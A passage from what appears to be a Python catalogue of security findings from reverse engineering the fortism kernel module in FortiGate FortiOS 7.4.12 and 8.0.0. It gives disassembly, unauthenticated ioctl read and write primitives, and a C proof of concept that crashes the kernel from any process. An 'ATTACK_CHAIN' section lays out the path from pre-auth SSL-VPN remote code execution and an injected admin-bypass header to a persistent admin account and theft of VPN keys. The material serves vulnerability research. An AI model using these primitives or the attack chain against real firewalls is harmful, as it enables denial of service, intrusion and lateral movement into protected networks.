            "Ramdump read at phys 0x2889310 (VMA 0x81889310): 4-byte value = 0x9f1bb0bc. "
            "Top 32 bits are 0x00000000 in the full 8-byte read (0xae8537c19f1bb0bc reflects "
            "two adjacent 32-bit fields). Value does not have 0xffff... kernel pointer prefix. "
            "Cross-checking static vmlinux: .data BSS-zero at foff 0x1889310, confirming it is "
            "a dynamically assigned runtime value. "
            "Write site (vma 0x8055d948): `mov dword ptr [rip+disp], 1` during fortism init "
            "path (after successful registration call). Value later changes to 0x9f1bb0bc, "
            "suggesting it is incremented/modified during module operation (epoch or session counter). "
            "12 RIP-relative readers in the 0x554xxx-0x55dxxx range all perform 32-bit reads. "
            "Conclusion: this is a Fortinet internal session-state counter, NOT a kernel address. "
            "KASLR bypass REFUTED. Finding remains MEDIUM: kernel internal state leaked without "
            "privilege check to any caller."
        ),
    },

    "status": "CONFIRMED — unauthorized kernel state leak via copy_to_user(user_ptr, 0x81889310, 4); "
              "live value 0x9f1bb0bc is runtime counter (NOT address material); KASLR bypass REFUTED",
}

# ─────────────────────────────────────────────────────────
# FGT-F12: Null pointer dereference in fortism type-7 chain walker
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep; fortism hook at 0x551407
# ─────────────────────────────────────────────────────────
FGT_F12_FORTISM_NULL_CHAIN = {
    "id":       "FGT-F12",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "MEDIUM",
    "class":    "Null Pointer Dereference in LSM Hook (kernel panic / DoS)",

    "description": (
        "The fortism hook at vma 0xffffffff80551407 (likely fortism_inode_setattr or "
        "fortism_path_rename based on its type dispatch) contains a type-7 branch that walks "
        "a linked list via `[r13+0x30]->next`. The null check at 0x80551480 (`test rdx, rdx; je`) "
        "fires for the first element only. The chain-walk at 0x5514c7 does: "
        "`mov rax, [r13+0x30]; mov rax, [rax]; mov [r13+0x30], rax` with only a sentinel-value "
        "check (`cmp rax, 0x8165f620`) before the dereference, not a null check. "
        "If the linked list contains a null mid-chain (uninitialized allocation or concurrent modification), "
        "the kernel dereferences null and panics. The sentinel is Fortinet-specific and not "
        "the standard Linux list head pattern."
    ),

    "vmlinux": {
        "vma":    "0xffffffff80551407",
        "foff":   "0x551407",
        "type_dispatch_at": "0xffffffff8055146d",
        "chain_walk_at":    "0xffffffff805514c7",
    },

    "asm_key_sequence": """
; type-7 dispatch at 0xffffffff8055146d:
mov eax, dword ptr [r13 + 0x58]   ; type field
cmp eax, 7
jne other_cases
; type-7 path:
mov eax, dword ptr [r14 + 0x428]  ; field in outer structure
test eax, eax
jne 0xffffffff80551971             ; if set, take alternate path
mov rax, [r13 + 0x30]             ; DEREF 1 — load list head (checked for null earlier)
mov rax, [rax]                    ; DEREF 2 — load next pointer — NULL IF MID-CHAIN NULL
mov [r13 + 0x30], rax             ; advance list
mov [r13 + 0x50], 0               ; clear field
mov [r13 + 0x40], 0
mov [r13 + 0x48], 0
; check for sentinel (not null):
cmp rax, 0xffffffff8165f620       ; SENTINEL CHECK — skips null
je sentinel_exit
""",

    "impact": "Kernel panic via null-ptr dereference -> system reboot. Reachable on any path that creates a fortism object with type=7 and a partial list.",
    "status": "CANDIDATE — trigger condition (type=7 with mid-chain null) not yet exercised",
}

# ─────────────────────────────────────────────────────────
# FGT-F13: fortism global security flag set without capability check
# FortiOS 7.4.12 vmlinux — fortism hook at 0x55e297
# ─────────────────────────────────────────────────────────
FGT_F13_FORTISM_GLOBAL_FLAG = {
    "id":       "FGT-F13",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "MEDIUM",
    "class":    "Missing Privilege Check Before Global Security Flag Write",

    "description": (
        "The fortism hook at vma 0xffffffff8055e297 (confirmed by function pointer in "
        "fortism LSM hook structure at .rodata 0x123d3b8) acquires a mutex on the global "
        "fortism state at 0x816609e0, writes the value 1 to a global flag at "
        "`[rip + 0x1102763]` (= approximately 0xffffffff81661ffa), then releases the mutex. "
        "There is no capability check (no capable(), no ns_capable(), no CAP_SYS_ADMIN) "
        "before the mutex acquisition. If this hook is invoked via an LSM path reachable "
        "from a Fortinet CLI user context that does not have full kernel capability, "
        "it can flip the global enforcement flag, potentially disabling fortism enforcement system-wide."
    ),

    "vmlinux": {
        "vma":   "0xffffffff8055e297",
        "foff":  "0x55e297",
        "rodata_hook_ptr_at": "0x123d3b8",
        "global_flag_approx_vma": "0xffffffff81661ffa",
    },

    "asm": """
0xffffffff8055e297  mov rdi, 0xffffffff816609e0   ; mutex addr
0xffffffff8055e29e  call mutex_lock               ; no capability check before this
0xffffffff8055e2a3  test eax, eax
0xffffffff8055e2a5  js fail
0xffffffff8055e2ab  mov dword ptr [rip + 0x1102763], 1  ; GLOBAL FLAG SET
0xffffffff8055e2b5  mov rdi, 0xffffffff816609e0
0xffffffff8055e2bc  call mutex_unlock
0xffffffff8055e2c1  mov eax, 1
0xffffffff8055e2c6  pop rbp
0xffffffff8055e2c7  ret
""",

    "impact": "If reachable from unprivileged context: globally disables fortism LSM enforcement for all processes on the system.",
    "status": "CANDIDATE — LSM hook invocation context (which file operation triggers this) not yet mapped",
}

# ─────────────────────────────────────────────────────────
# FGT-F14: fortism_inode_alloc_security partial failure -> memory leak
# FortiOS 7.4.12 vmlinux — hooks at 0x5511f5 (alloc) and 0x5511d0 (free)
# ─────────────────────────────────────────────────────────
FGT_F14_FORTISM_INODE_MEMLEAK = {
    "id":       "FGT-F14",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism LSM module)",
    "severity": "LOW",
    "class":    "Memory Leak in LSM inode_alloc_security Error Path",

    "description": (
        "The fortism inode security allocation hook at vma 0xffffffff805511f5 allocates two "
        "kernel objects: a primary security blob (r12) and an inner structure at [r12+0x60]. "
        "On failure of the inner allocation, the code jumps to 0x80551267 without freeing r12 "
        "and without zeroing [r12+0x60] before storing r12 into the inode's security pointer "
        "[rbx+0xc0]. The corresponding free hook at 0xffffffff805511d0 calls kfree([r12+0x60]) "
        "then kfree(r12). If the inner alloc failed and [r12+0x60] was never initialized to zero "
        "before the jump, the free hook operates on garbage memory at [r12+0x60], "
        "potentially freeing an arbitrary kernel pointer. "
        "NOTE: In the observed disassembly, [r12+0x60] is stored BEFORE the null check "
        "(0x551248 stores, 0x551250 checks, 0x551252 stores r12 into inode). "
        "If the second alloc is null, the inode's [+0xc0] does NOT get r12 stored "
        "(store is at 0x551252, AFTER the failure jump at 0x551250), so r12 leaks without a crash."
    ),

    "vmlinux": {
        "alloc_hook_vma": "0xffffffff805511f5",
        "free_hook_vma":  "0xffffffff805511d0",
        "inner_alloc_failure_jump": "0xffffffff80551267",
        "inode_secblob_store": "0xffffffff80551252",
    },

    "impact": "Kernel memory leak of one kmalloc slab object per inode creation under memory pressure. No immediate security impact; contributes to slab exhaustion over time.",
    "status": "CONFIRMED — code flow analyzed; triggers under kmalloc failure (memory pressure or KASAN injection)",
}

# ─────────────────────────────────────────────────────────
# Attack chain: FortiGate VM RE -> exploitation
# ─────────────────────────────────────────────────────────
ATTACK_CHAIN = {
    "summary": "FortiOS 7.0.9 — anonymous network access to full compromise",
    "steps": [
        {
            "step": 1,
            "action": "SSL-VPN pre-auth RCE via CVE-2023-27997",
            "detail": "POST /remote/fgt_lang?lang=<payload> — heap overflow, no auth required",
            "finding": "FGT-F05",
            "impact": "RCE as /bin/init (65MB monolith = all services)",
        },
        {
            "step": 2,
            "action": "Alt: HA trust header injection",
            "detail": "If management port accessible, inject X-ADMIN-SUPER:1 to skip auth",
            "finding": "FGT-F04",
            "impact": "Admin API access without credentials",
        },
        {
            "step": 3,
            "action": "Persist via API or config modification",
            "detail": "/api/v2/cmdb/system/admin — add admin account or SSH key",
            "finding": "FGT-F08",
        },
        {
            "step": 4,
            "action": "Lateral movement via IPsec/SSL-VPN trust",
            "detail": "FGT controls VPN for downstream network; extract PSKs/certs from config",
        },
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F16: Integer overflow -> kernel DoS in FortiOS 8.0.0 (FGT-F11 homolog)
# FortiOS 8.0.0 VM64-KVM vmlinux — fortism ioctl handler at 0x55c546 (ioctl 0x9007 branch)
# Confirmed via cross-version Ablation BERT homolog tracking + direct disassembly
# ─────────────────────────────────────────────────────────
FGT_F16_800_IOCTL_HEAP_OVERFLOW = {
    "id":       "FGT-F16",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "CRITICAL",
    "class":    "Integer Overflow -> Kernel DoS via fortism LSM file_ioctl hook (FGT-F11 homolog)",

    "description": (
        "Identical vulnerability class to FGT-F11 (FortiOS 7.4.12), confirmed present in 8.0.0. "
        "The fortism LSM file_ioctl hook moved to vma 0xffffffff8055c546 in 8.0.0. "
        "The ioctl 0x9007 integer overflow path is at 0x55c73d: "
        "`lea edi, [rax+1]` with rax=0xffffffff wraps edi to 0; "
        "kmalloc(0) returns a valid zero-size SLUB allocation; "
        "`movsxd rdx, [rbp-0x5c]` sign-extends 0xffffffff to SIZE_MAX; "
        "copy_from_user(heap_buf, user_str, SIZE_MAX) triggers error path; "
        "copy_from_user at 0x601b2e has the same error-path bug: "
        "TWO error paths (overflow jb + addr_limit jb) both reach memset(heap_buf, 0, SIZE_MAX); "
        "rep stosq from heap_buf until unmapped page -> kernel crash. "
        "No privilege required; any fd works."
    ),

    "vmlinux_800": {
        "binary":  "FortiOS 8.0.0 vmlinux (extracted from flatkc bzImage, P1 of FGT_VM64_KVM-v8.0.0.F-build0167)",
        "buildid": "474e550043e6c79f25c4e6509765325de60ad04e",
        "vma_handler":     "0xffffffff8055c546",
        "foff_handler":    "0x55c546",
        "vma_0x9007_path": "0xffffffff8055c73d",
        "foff_0x9007":     "0x55c73d",
        "vma_copy_from_user": "0xffffffff80601b2e",
        "foff_copy_from_user": "0x601b2e",
    },

    "asm_critical_path_0x9007": """
; 8.0.0 ioctl 0x9007 path at 0xffffffff8055c73d (identical semantics to 7.4.12):
mov edx, 0x10
mov rsi, r12                           ; user pointer (ioctl arg)
lea rdi, [rbp - 0x60]
call copy_from_user(stack, user, 16)   ; {word0[4], word1_length[4], string_ptr[8]}

mov eax, [rbp - 0x5c]                 ; word1 (user-controlled LENGTH)
lea edi, [rax + 1]                     ; 32-BIT OVERFLOW: 0xffffffff+1 = 0
movsxd rdi, edi                        ; sign-extend: rdi=0
call kmalloc(0, GFP_KERNEL)            ; valid zero-size SLUB allocation

movsxd rdx, [rbp - 0x5c]              ; SIZE_MAX (sign-extend 0xffffffff)
mov rsi, [rbp - 0x58]                  ; user string_ptr
mov rdi, rax                            ; zero-size heap buf
call copy_from_user(heap, user, SIZE_MAX)
; copy_from_user error path (overflow detected):
;   jb -> memset(heap_buf, 0, SIZE_MAX) -> rep stosq -> kernel crash
""",

    "copy_from_user_error_path": {
        "overflow_jb":    "0x601b51: add rax,r12 (overflow) -> jb 0x601b75 -> memset(dst,0,SIZE_MAX)",
        "addr_limit_jb":  "0x601b56: jb 0x601b8a -> rax=SIZE_MAX; jmp 0x601b62 -> jne 0x601b6c -> sub/add -> 0x601b75",
        "memset_call":    "0x601b7d: call 0xce5010 (rep stosq memset) with rdx=SIZE_MAX, rdi=heap_buf, esi=0",
        "both_paths_trigger_dos": True,
    },

    "trigger_poc": """
// Identical to FGT-F11 PoC. No root required. Any process, any fd.
int fd = open("/dev/null", O_RDONLY);
void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
struct { uint32_t word0; uint32_t word1; uint64_t string_ptr; }
    payload = {1, 0xffffffff, (uint64_t)user_region};
ioctl(fd, 0x9007, &payload);
// -> kernel crash via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path
""",

    "cross_version_tracking": {
        "method": "Ablation BERT cross-version homolog tracking + rodata function pointer scan",
        "7412_foff": "0x552080 (handler), 0x55227e (0x9007 path)",
        "800_foff":  "0x55c546 (handler), 0x55c73d (0x9007 path)",
        "offset_delta": "0xa4c6 bytes from 7.4.12 to 8.0.0 (handler), 0xa4bf (0x9007 path)",
        "rodata_hook_foff_800": "0x123cc88 (fortism LSM hooks structure, +0x60 from base)",
    },

    "status": "CRITICAL — DoS confirmed by structural analysis; same memset(heap,0,SIZE_MAX) bug in 8.0.0 copy_from_user",

    "arm64_architecture_note": {
        "image_file": "FGT_ARM64_KVM-v8.0.0.F-build0167-FORTINET.qcow2 -> flatkc_arm64",
        "ioctl_0x9007_arm64_foff": "0x2dfa2c",
        "arm64_integer_overflow": (
            "SAME overflow present: `add w0, w0, #1` on w0=0xffffffff -> w0=0 (32-bit). "
            "`sxtw x0, w0` -> x0=0. `bl kmalloc(0)` -> SLUB ptr."
        ),
        "arm64_dos_status": (
            "NOT confirmed. ARM64 uses standard Linux ARM64 copy_from_user at 0x93d9c0. "
            "access_ok correctly uses ARM64 overflow-safe pattern (adds+csel+csinv+sbcs+cset). "
            "For SIZE_MAX len: `adds x1, x1, x19` (src + SIZE_MAX) sets Carry for any nonzero src. "
            "`csel x2, xzr, x2, hi` zeros addr_limit on overflow, causing sbcs check to fail. "
            "access_ok returns FAIL -> branch to EFAULT error path WITHOUT any memset. "
            "ARM64 error path at 0x2dfb7c/0x2dfb90 returns EFAULT only. "
            "Kernel panic does NOT occur. FGT-F16 DoS is x86-64 specific (custom Fortinet copy_from_user bug)."
        ),
        "arm64_kmalloc_0_note": (
            "Integer overflow (kmalloc(0)) does occur in ARM64 as in x86-64. "
            "However without the follow-on SIZE_MAX copy_from_user crash, "
            "the SLUB ptr is freed cleanly -> no exploitable primitive."
        ),
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F17: Kernel info leak via fortism ioctl 0x9005 in FortiOS 8.0.0 (FGT-F15 homolog)
# FortiOS 8.0.0 vmlinux — fortism ioctl handler 0x55c546, ioctl 0x9005 branch at 0x55c6b0
# ─────────────────────────────────────────────────────────
FGT_F17_800_IOCTL_INFOLEAK = {
    "id":       "FGT-F17",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM",
    "class":    "Kernel Information Leak via fortism ioctl 0x9005 — 8.0.0 homolog of FGT-F15",

    "description": (
        "Identical vulnerability class to FGT-F15 (FortiOS 7.4.12). "
        "In 8.0.0 ioctl 0x9005 path (vma 0xffffffff8055c6b0): "
        "`mov rsi, 0xffffffff8188a410; mov rdi, r12; call copy_to_user(r12, 0x8188a410, 4)`. "
        "Source address changed from 7.4.12's 0x81889310 to 0x8188a410. "
        "Same: no privilege check, leaks 4 bytes of kernel .data to any caller. "
        "0x8188a410 is a BSS-zero in static vmlinux (.data section); runtime value "
        "is a Fortinet internal state counter (same class as FGT-F15's 0x81889310)."
    ),

    "vmlinux_800": {
        "vma_0x9005_branch":  "0xffffffff8055c6b0",
        "foff_0x9005":        "0x55c6b0",
        "kernel_src_addr":    "0xffffffff8188a410",
        "copy_size":          "4 bytes",
        "vs_7412_src_addr":   "0xffffffff81889310 (changed by 0x10100 between versions)",
    },

    "asm": """
; 8.0.0 ioctl 0x9005 at 0xffffffff8055c6b0:
mov edx, 4
mov rsi, 0xffffffff8188a410   ; kernel .data global (8.0.0 address)
mov rdi, r12                   ; user destination pointer (ioctl arg)
call copy_to_user              ; 0x601b00: leaks 4 bytes to userspace, no priv check
test rax, rax
jne error
xor ebx, ebx                   ; return 0 on success
""",

    "status": "CONFIRMED — same unauthorized kernel state leak pattern as FGT-F15; source address updated for 8.0.0",
}

# ─────────────────────────────────────────────────────────
# FGT-F18: LSM hook unconditional zero return (CANDIDATE)
# Affects: FortiOS 8.0.0 (foff 0x55b4b0); 7.4.12 homolog not yet located
# ─────────────────────────────────────────────────────────
FGT_F18_LSM_HOOK_ZERO_RETURN = {
    "id":       "FGT-F18",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "CANDIDATE — class TBD pending hook type identification",
    "class":    "LSM hook unconditional zero return — potential auth bypass",

    "vmlinux_800": {
        "buildid":      "474e550043e6c79f25c4e6509765325de60ad04e",
        "foff_hook":    "0x55b4b0",
        "vma_hook":     "0xffffffff8055b4b0",
        "rodata_position": "fortism LSM hooks table + 0x60 (sixth pointer slot from base 0x123cc68)",
    },

    "disassembly": """\
push rbp
mov rbp, rsp
push rbx
mov rbx, qword ptr [rsi + 0xc0]    ; deref arg1+0xc0 -> inner struct (rbx)
mov rdi, qword ptr [rbx + 0x60]    ; load child ptr from inner struct+0x60
call 0xffffffff8042774f              ; touch/reference child ptr (page-table walk)
mov rdi, rbx                         ; restore inner struct
call 0xffffffff8042774f              ; touch/reference inner struct
xor eax, eax                         ; UNCONDITIONAL: return 0 (allow)
pop rbx
pop rbp
ret
""",

    "called_function_0x42774f": (
        "Page-table-based memory reference function. "
        "Takes a kernel VA in rdi. Computes page-table entry via "
        "(va + 0x80000000) >> 12 << 6 + table_base, checks a flag at entry+8 bit 0, "
        "then conditionally calls 0x42694b with entry+0x18. "
        "Appears to be a kmap/memory-touch operation, NOT a security check. "
        "Return value ignored by the hook."
    ),

    "bert_evidence": (
        "BERT sweep hit 7 patterns: AUTH_BYPASS, KEY_MGMT, CRYPTO_WEAK, PRIV_ESC, "
        "RACE_CONDITION, SIGNED_VERIFY_BYPASS, INTEGER_OVERFLOW. "
        "Highest cross-query hit count in the 929-function corpus. "
        "Score 0.387 (RACE_CONDITION query)."
    ),

    "hook_identification": {
        "method": "rodata hook table scan — hook at table_base+0x60",
        "args_observed": "(rdi=?, rsi=struct_with_inner_at_0xc0)",
        "possible_hooks": [
            "fortism_cred_free (cleanup — zero return correct)",
            "fortism_bprm_committing_creds (setup — zero return allows)",
            "fortism_task_free (cleanup — zero return correct)",
            "fortism_inode_free_security (cleanup — zero return correct)",
        ],
        "dangerous_if": (
            "Hook is fortism_inode_permission, fortism_file_permission, "
            "fortism_task_kill, or any access-control hook. "
            "In those cases: unconditional zero return bypasses ALL fortism "
            "mandatory access control for the affected operation system-wide."
        ),
        "resolution_needed": "Dynamic tracing (ftrace/kprobe on hook entry) to identify call site",
    },

    "status": (
        "CANDIDATE — hook always returns 0 (never blocks); "
        "impact is auth bypass (CRITICAL) if hook is an access-control gate, "
        "or benign if hook is a cleanup/free path. "
        "Dynamic analysis required to confirm hook type."
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F19: Ioctl 0x9004 unauth write to kernel object field+0x44
# Affects: FortiOS 7.4.12 AND 8.0.0 (same pattern)
# ─────────────────────────────────────────────────────────
FGT_F19_IOCTL_0x9004_UNAUTH_WRITE = {
    "id":       "FGT-F19",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 + 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "HIGH — conditional (impact determined by runtime object+0x44 semantics)",
    "class":    "Unprivileged write to kernel object field via fortism ioctl 0x9004",

    "versions": {
        "7412_x86": {
            "foff_cmp_0x9004":   "0x5520c7",
            "foff_write_insn":   "0x55210b",
            "write_insn":        "mov dword ptr [rax + 0x44], r12d",
            "object_lookup":     "0x5528b8",
        },
        "800_x86": {
            "foff_cmp_0x9004":   "0x55c58b",
            "foff_write_insn":   "0x55c5cf",
            "write_insn":        "mov dword ptr [rax + 0x44], ebx",
            "object_lookup":     "0x55ce3b",
        },
        "800_arm64": {
            "image_file":        "FGT_ARM64_KVM-v8.0.0.F-build0167-FORTINET.qcow2 -> flatkc_arm64",
            "foff_cmp_0x9004":   "0x2df76c (movz w0, #0x9004; cmp w19, w0)",
            "foff_write_insn":   "0x2df7e0",
            "write_insn":        "str w19, [x0, #0x44]  (ARM64 DWORD store)",
            "object_lookup":     "0x2e03f0",
            "access_ok":         "correct — standard Linux ARM64 pattern (adds+csel+csinv+sbcs+cset)",
            "privilege_gate":    "absent — same as x86-64 (no gate before 0x9004 path)",
            "note": (
                "ARM64 handler is structurally identical to x86-64. "
                "MOV+CMP instruction pair used in place of x86 direct CMP immediate. "
                "FGT-F19 confirmed cross-architecture."
            ),
        },
    },

    "attack_flow": """\
; User-supplied struct: { uint32_t index; int32_t new_value; }
; Call: ioctl(any_fd, 0x9004, &user_struct)
;
; ioctl 0x9004 path (no privilege check):
copy_from_user(&kbuf, user_ptr, 8)   ; read 8 bytes: [0:4]=index, [4:8]=new_value
mov edi, kbuf[0:4]                    ; index
cmp edi, 0x40                          ; bounds check: index <= 64
ja  -> EINVAL
call object_lookup(index)             ; rax = object_table[index * 8]
; object_lookup: rax = [0x8188a440 + index * 8]  (runtime-populated)
test rax, rax
je  -> ENULL
movsxd rbx, kbuf[4:8]                 ; sign-extend new_value
mov dword ptr [rax + 0x44], ebx       ; WRITE: object->field_0x44 = new_value
return 0
""",

    "privilege_comparison": {
        "0x9002": "PRIVILEGED — gate: task_struct security blob == Fortinet sentinel 0xffffffff81646b40 (8.0.0)",
        "0x9003": "UNPRIVILEGED — read path (see FGT-F20)",
        "0x9004": "UNPRIVILEGED — write path (THIS FINDING)",
        "0x9005": "UNPRIVILEGED — info leak (FGT-F15/F17)",
        "0x9007": "UNPRIVILEGED — heap alloc+copy (FGT-F11/F16)",
        "0x9009": "UNPRIVILEGED — read field+0x30 from object",
    },

    "object_table": {
        "vma":          "0xffffffff8188a440",
        "foff_800":     "0x188a440 (DATA section)",
        "slot_count":   65,
        "slot_size":    8,
        "runtime_note": (
            "All 65 slots are NULL in the static binary. "
            "Populated at runtime by Fortinet daemons (miglogd, fcnacd, etc.) "
            "calling fortism's registration interface. "
            "Objects are accessible as soon as any daemon registers them."
        ),
    },

    "field_0x44_analysis": {
        "object_0x9003_readable_range": "fields +4 through +32 (28 bytes — see FGT-F20)",
        "field_0x44_position": "+68 bytes from object base — outside 0x9003 readable range",
        "field_0x30_via_0x9009": "readable via ioctl 0x9009 (sign-extended, returned directly)",
        "unknown": (
            "field+0x44 semantics require dynamic analysis or daemon source. "
            "Candidates: security_level, capability_mask, mode_flags, refcount. "
            "Writing -1 (0xffffffff) or 0 may escalate or suppress security enforcement."
        ),
    },

    "status": (
        "CONFIRMED attack primitive — any process can write 32-bit value to "
        "kernel object field+0x44 via bounded (0..0x40) index. "
        "Impact = HIGH if field+0x44 is a security-relevant flag; "
        "MEDIUM if it is an application-layer counter. "
        "Exploitability confirmed once runtime object structure is known."
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F20: Ioctl 0x9003 unauth read of 28 bytes from kernel object
# Affects: FortiOS 7.4.12 AND 8.0.0 (same pattern)
# ─────────────────────────────────────────────────────────
FGT_F20_IOCTL_0x9003_UNAUTH_READ = {
    "id":       "FGT-F20",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 + 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM — kernel object fields exposed without privilege check",
    "class":    "Unprivileged read of kernel object internal fields via fortism ioctl 0x9003",

    "versions": {
        "7412_x86": {
            "foff_handler_entry": "0x55220e",
        },
        "800_x86": {
            "foff_handler_entry": "0x55c6cd",
        },
        "800_arm64": {
            "foff_handler_entry":   "0x2df964",
            "read_method":          "ldp x2,x3,[x0+4]; stp to stack; ldr/str for remainder",
            "copy_to_user":         "0x93df80 (standard Linux ARM64 copy_to_user)",
            "confirmed":            True,
        },
    },

    "attack_flow": """\
; User-supplied struct: { uint32_t index; uint8_t pad[32]; }  (36 bytes total)
; Call: ioctl(any_fd, 0x9003, &user_struct)  -> fills user_struct with object data
;
; ioctl 0x9003 path (no privilege check):
copy_from_user(&kbuf, user_ptr, 36)   ; read 36 bytes: [0:4]=index
mov edi, kbuf[0:4]
cmp edi, 0x40
ja  -> EINVAL
call object_lookup(index)             ; rax = object_table[index * 8]
test rax, rax
je  -> ENULL
; Selectively copy object fields into kbuf:
kbuf[8:16]  = object[4:12]    ; via mov rdx,[rax+4]; mov [rbp-0x58],rdx
kbuf[16:24] = object[12:20]   ; via mov rdx,[rax+0xc]
kbuf[24:32] = object[20:28]   ; via mov rdx,[rax+0x14]
kbuf[32:36] = object[28:32]   ; via mov eax,[rax+0x1c] (DWORD only)
copy_to_user(user_ptr, &kbuf, 36)     ; return 28 bytes of object data to user
return 0
""",

    "leaked_object_layout": {
        "+0x00": "NOT leaked (first 4 bytes of object — possibly magic/type)",
        "+0x04": "leaked at user_out[8:16]",
        "+0x0c": "leaked at user_out[16:24]",
        "+0x14": "leaked at user_out[24:32]",
        "+0x1c": "leaked at user_out[32:36] (DWORD only, 4 bytes)",
    },

    "utility": (
        "Combined with FGT-F19 (0x9004 write), allows read-before-write: "
        "attacker reads object state via 0x9003, infers object type from field values, "
        "then writes targeted value to field+0x44 via 0x9004. "
        "Also useful for runtime object discovery: "
        "iterate index 0..0x40 with 0x9003 to find populated slots."
    ),

    "status": "CONFIRMED attack primitive — 28 bytes of runtime kernel object data readable by any process via bounded index; impact scales with what data the registered objects contain",
}

# ─────────────────────────────────────────────────────────
# FGT-F21 — ioctl 0x9005 unauth kernel global read + 0x9009 conditional read
# ─────────────────────────────────────────────────────────
FGT_F21_IOCTL_0x9005_UNAUTH_GLOBAL_READ = {
    "id": "FGT-F21",
    "product": "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "LOW-MEDIUM — unauth kernel data disclosure; runtime impact depends on global content",
    "class": "Unauth kernel global read via ioctl 0x9005 (and 0x9009 conditionally)",

    "0x9005_x86_800": {
        "foff_handler": "0x55c6b0",
        "source_vma": "0xffffffff8188a410",
        "source_foff": "0x188a410 (in vmlinux .data section, zero in static image)",
        "source_note": "0x30 bytes before the object table at 0xffffffff8188a440",
        "transfer": "copy_to_user(user_ptr, &global, 4) -- 4 bytes unconditional",
        "privilege_gate": "ABSENT -- no privilege check before copy_to_user",
        "disasm": [
            "mov edx, 4",
            "mov rsi, 0xffffffff8188a410  ; source global",
            "mov rdi, r12                 ; user dst",
            "call copy_to_user            ; 0x80601b00",
            "xor ebx, ebx                 ; return 0",
        ],
    },

    "0x9009_x86_800": {
        "foff_handler": "0x55c5ef",
        "global_vma": "0xffffffff8188a410 (same as 0x9005)",
        "condition": "object[+0x30] == 3 (signed 32-bit comparison)",
        "disasm": [
            "call copy_from_user(stack, user, 4)   ; read index",
            "cmp edi, 0x40                          ; bounds check",
            "call object_lookup(index)",
            "movsxd rbx, [rax+0x30]                ; read object[+0x30]",
            "cmp ebx, 3",
            "jne epilogue                           ; if != 3, return field value directly",
            "movsxd rbx, [rip+0x132dddd]           ; rip+offset = 0xffffffff8188a410",
            "jmp epilogue                           ; return global value",
        ],
        "dual_behavior": (
            "If object[+0x30] != 3: returns object[+0x30] itself (leaks object field). "
            "If object[+0x30] == 3: returns the runtime global at 0x8188a410 (leaks Fortinet global). "
            "Either case: no privilege check."
        ),
    },

    "runtime_global_significance": (
        "0xffffffff8188a410 is 0x30 bytes before the 64-slot Fortinet object table (0x8188a440). "
        "At runtime: populated by Fortinet daemon init. "
        "In static vmlinux: zero (BSS). "
        "Could contain: slot count, version tag, init flag, or a kernel pointer. "
        "If it contains a kernel pointer: FGT-F21 enables KASLR bypass for any local process."
    ),

    "arm64_800": {
        "foff_handler": "0x2dfb28",
        "source_foff_in_image": "0x10f17c0 (in ARM64 image BSS, beyond file at 0x10b4a00)",
        "source_note": "PC-relative ADRP offset 0xe12000 from ioctl handler -> BSS global",
        "confirmed": True,
    },

    "status": "CONFIRMED class, runtime value unknown (BSS in static binary). KASLR bypass potential if global contains kernel pointer.",
}

# ─────────────────────────────────────────────────────────
# FGT-F22 — ioctl 0x9007 unauth kernel string-write primitive
# ─────────────────────────────────────────────────────────
FGT_F22_IOCTL_0x9007_STRING_WRITE = {
    "id": "FGT-F22",
    "product": "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM (fortism kernel module)",
    "severity": "HIGH — unauth controlled heap allocation + kernel string write; DoS confirmed (FGT-F16); escalation path depends on 0x55db6d semantics",
    "class": "Unauth controlled kernel heap allocation + string injection via ioctl 0x9007",

    "x86_800": {
        "foff_handler": "0x55c73d",
        "input_layout": {
            "bytes_0_3": "index (DWORD) -- passed to 0x55db6d",
            "bytes_4_7": "size (DWORD) -- controls allocation size",
            "bytes_8_15": "user_ptr (QWORD) -- source of string data",
        },
        "total_input": "16 bytes from user, no privilege check",
        "flow": [
            "copy_from_user(stack, user, 16)         ; read 16 bytes",
            "lea edi, [size + 1]                     ; 32-bit ADD -> wraps to 0 if size=0xffffffff",
            "movsxd rdi, edi                         ; sign-extend",
            "kmalloc(rdi, GFP_KERNEL|0xc0)           ; allocates size+1 bytes",
            "copy_from_user(kmalloc_buf, user_ptr, size)  ; copies string from user ptr",
            "kmalloc_buf[size] = 0x00                ; null-terminate",
            "call 0x55db6d(index, kmalloc_buf)       ; Fortinet string-op with index+buf",
            "call 0x42774f(kmalloc_buf)              ; release/unmap heap buf",
        ],
        "privilege_gate": "ABSENT",
        "integer_overflow": (
            "If size=0xffffffff: lea edi=[0xffffffff+1]=0 (32-bit wrap). "
            "kmalloc(0) returns valid SLUB ptr (~64 bytes). "
            "Then copy_from_user(kmalloc_buf, user_ptr, 0xffffffff). "
            "Fortinet custom copy_from_user: memset(heap, 0, SIZE_MAX) via rep stosq -> CRASH. "
            "This is the FGT-F16 DoS primitive specifically triggered via ioctl 0x9007 with size=0xffffffff."
        ),
        "post_overflow_null_write": (
            "After copy_from_user: `mov byte ptr [r12 + rax], 0` where r12=kmalloc_buf, rax=size. "
            "For size=0xffffffff: writes 0 to kmalloc_buf+0xffffffff (4GB past allocation head). "
            "For normal sizes: legitimate null terminator at end of allocated region."
        ),
        "0x55db6d_call_note": (
            "0x55db6d receives (index, kernel_string_ptr). "
            "If it performs any object-table lookup via index, user controls the string stored at "
            "an indexed kernel object slot. This is a potential kernel string-injection primitive "
